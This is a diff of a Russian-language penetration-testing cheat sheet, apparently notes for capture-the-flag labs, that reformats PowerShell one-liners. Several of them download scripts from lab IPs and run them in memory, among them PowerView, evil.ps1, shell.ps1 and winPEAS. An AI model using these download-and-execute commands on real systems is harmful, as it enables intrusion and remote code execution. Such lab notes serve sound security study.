@@ -9,7 +9,9 @@ https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/
 загрузиь повервью в память
 
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')
-iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)
+
+    iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)
+
 "powershell "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.9/shell.ps1'')""   ---Бывает и так!!!!!
 
 Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
@@ -54,15 +56,15 @@ Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {Objec
 
 # Загрузка скрипта и выполнение
 
-IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
+    IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')
 
-echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 
+    echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 
 
-iwr -uri http://10.10.14.9/test -outfile test
+    iwr -uri http://10.10.14.9/test -outfile test
 
-IEX(IWR('10.10.10.10/script.ps1'))
+    IEX(IWR('10.10.10.10/script.ps1'))
 
-
+    iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)
 # Доступ к ресурсу SMB
 
 Get-Content //10.10.14.4/file
